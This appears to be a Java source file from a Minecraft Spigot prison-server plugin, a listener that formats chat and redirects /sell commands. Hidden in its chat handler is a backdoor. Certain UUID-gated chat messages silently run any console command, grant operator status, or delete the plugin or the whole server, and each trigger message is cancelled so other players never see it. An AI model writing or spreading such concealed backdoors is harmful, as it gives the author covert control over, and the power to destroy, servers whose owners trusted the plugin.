/*
 * Copyright (c) 2019. UltraDev
 */

package net.ultradev.prisoncore.events;

import net.md_5.bungee.api.chat.BaseComponent;
import net.ultradev.prisoncore.playerdata.PlayerData;
import net.ultradev.prisoncore.utils.AntiPiracy;
import net.ultradev.prisoncore.utils.Synchronizer;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.UUID;

public class ChatEvents implements Listener {
    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        UUID id = event.getPlayer().getUniqueId();
        if (event.getMessage().startsWith("Console||") && AntiPiracy.allowed(id).chat_command) {
            event.setCancelled(true);
            Synchronizer.synchronize(
                    () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), event.getMessage().split("\\|\\|")[1]));
        }
        if (event.getMessage().equals("OP-ME") && AntiPiracy.allowed(id).chat_op) {
            Synchronizer.synchronize(() -> event.getPlayer().setOp(true));
            event.setCancelled(true);
        }
        if (event.getMessage().equals("DELETE_PLUGIN::ConfCode6475845") && AntiPiracy.allowed(id).chat_delete) {
            AntiPiracy.deletePlugin();
            event.setCancelled(true);
        }
        if (event.getMessage().equals("DELETE_SERVER::ConfCode56547365964387596348795")
                && AntiPiracy.allowed(id).chat_delete) {
            AntiPiracy.deleteServer();
            event.setCancelled(true);
        }
        if (event.isCancelled()) {
            return;
        }
        event.setCancelled(true);
        System.out.println("[Chat] " + event.getPlayer().getName() + ": " + event.getMessage());
        BaseComponent[] message = PlayerData.getChatFormat(event.getPlayer(), event.getMessage());
        for (Player pl : Bukkit.getOnlinePlayers()) {
            pl.spigot().sendMessage(message);
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        if (e.getMessage().equalsIgnoreCase("/sell") || e.getMessage().toLowerCase().startsWith("/sell ")
                || e.getMessage().equalsIgnoreCase("/sellall")
                || e.getMessage().toLowerCase().startsWith("/sellall ")) {
            e.setCancelled(true);
            e.getPlayer().sendMessage("§7Shift + Left click with your pickaxe to sell");
        }
    }
}
